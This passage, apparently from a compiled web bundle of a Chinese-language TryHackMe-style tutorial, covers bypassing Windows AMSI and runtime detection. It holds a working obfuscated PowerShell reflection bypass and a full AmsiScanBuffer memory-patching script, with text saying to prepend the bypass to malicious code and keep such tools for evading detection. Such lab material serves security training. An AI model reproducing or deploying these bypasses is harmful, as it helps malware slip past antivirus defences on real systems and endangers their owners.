[cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('M\xe3n\xe2ge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('\xc0ut\xf5m\xe2t\xee'+'\xf4n').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))\").GetField(\"$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))\", \"NonPublic,Static\").SetValue($null, [IntPtr]$qcgcjblv);\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u60a8\u53ef\u4ee5\u50cf\u4e4b\u524d\u7684\u7ed5\u8fc7\u65b9\u6cd5\u4e00\u6837\uff0c\u5c06\u8fd9\u4e2a\u7ed5\u8fc7\u4ee3\u7801\u9644\u52a0\u5230\u6076\u610f\u4ee3\u7801\u7684\u5f00\u5934\uff0c\u6216\u8005\u5728\u6267\u884c\u6076\u610f\u4ee3\u7801\u4e4b\u524d\u5728\u540c\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u8fd0\u884c\u5b83\u3002"}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"https://github.com/RythmStick/AMSITrigger",children:"AMSITrigger"})," \u5141\u8bb8\u653b\u51fb\u8005\u81ea\u52a8\u8bc6\u522b\u4f1a\u89e6\u53d1\u7b7e\u540d\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u548c\u7ed5\u8fc7\u3002\u4e0e\u5176\u4ed6\u65b9\u6cd5\u76f8\u6bd4\uff0c\u8fd9\u79cd\u7ed5\u8fc7 AMSI \u7684\u65b9\u5f0f\u66f4\u4e3a\u4e00\u81f4\uff0c\u56e0\u4e3a\u60a8\u662f\u8ba9\u6587\u4ef6\u672c\u8eab\u53d8\u5f97\u5e72\u51c0\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528 amsitrigger \u7684\u8bed\u6cd5\u76f8\u5bf9\u7b80\u5355\uff1b\u60a8\u9700\u8981\u6307\u5b9a\u6587\u4ef6\u6216 URL \u4ee5\u53ca\u626b\u63cf\u6587\u4ef6\u7684\u683c\u5f0f\u3002\u4ee5\u4e0b\u662f\u8fd0\u884c amsitrigger \u7684\u793a\u4f8b\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'C:\\Users\\Tryhackme\\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3\r\n$MethodDefinition = "\r\n\r\n    [DllImport(`"kernel32`")]\r\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\r\n\r\n    [DllImport(`"kernel32`")]\r\n    public static extern IntPtr GetModuleHandle(string lpModuleName);\r\n\r\n    [DllImport(`"kernel32`")]\r\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\r\n";\r\n\r\n$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name \'Kernel32\' -NameSpace \'Win32\' -PassThru;\r\n$handle = [Win32.Kernel32]::GetModuleHandle(\'amsi.dll\');\r\n[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, \'AmsiScanBuffer\');\r\n[UInt32]$Size = 0x5;\r\n[UInt32]$ProtectFlag = 0x40;\r\n[UInt32]$OldProtectFlag = 0;\r\n[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);\r\n$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);\r\n\r\n[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7b7e\u540d\u4ee5\u7ea2\u8272\u9ad8\u4eae\u663e\u793a\uff1b\u60a8\u53ef\u4ee5\u901a\u8fc7\u7f16\u7801\u3001\u6df7\u6dc6\u7b49\u65b9\u5f0f\u6765\u6253\u7834\u8fd9\u4e9b\u7b7e\u540d\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"conclusion---\u603b\u7ed3",children:"Conclusion - \u603b\u7ed3"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884c\u65f6\u68c0\u6d4b\u548cAMSI\u53ea\u662f\u9488\u5bf9\u7ecf\u8fc7\u5f3a\u5316\u6216\u4fdd\u6301\u66f4\u65b0\u7684\u8bbe\u5907\u65f6\u53ef\u80fd\u9047\u5230\u7684\u4f17\u591a\u68c0\u6d4b\u548c\u9632\u62a4\u624b\u6bb5\u4e4b\u4e00\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e9b\u7ed5\u8fc7\u65b9\u6cd5\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u4e0e\u5176\u4ed6\u6f0f\u6d1e\u548c\u6280\u672f\u7ed3\u5408\u4f7f\u7528\uff0c\u6700\u7ec8\u8fbe\u5230\u7ed5\u8fc7\u6240\u6709\u68c0\u6d4b\u7684\u76ee\u7684\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u91cd\u8981\u7684\u662f\u5c06\u8fd9\u4e9b\u5de5\u5177\u4fdd\u5b58\u5728\u4f60\u7684\u201c\u540e\u5907\u201d\u5de5\u5177\u5305\u4e2d\u3002\u867d\u7136\u4e0d\u80fd\u5b8c\u5168\u4f9d\u8d56\u5b83\u4eec\u6765\u7ed5\u8fc7\u6240\u6709\u68c0\u6d4b\uff0c\u4f46\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\u53ef\u4ee5\u6709\u6548\u907f\u5f00\u5f88\u591a\u68c0\u6d4b\u624b\u6bb5\u3002"})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(a,{...e})}):a(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>l,x:()=>c});var i=r(6540);const s={},t=i.createContext(s);function l(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),i.createElement(t.Provider,{value:n},e.children)}},9243:(e,n,r)=>{r.d(n,{A:()=>i});const i=r.p+"assets/images/efca9438e858f0476a4ffd777c36501a-2ebd14a1176e1dab9e6815555fc7f877.png"}}]);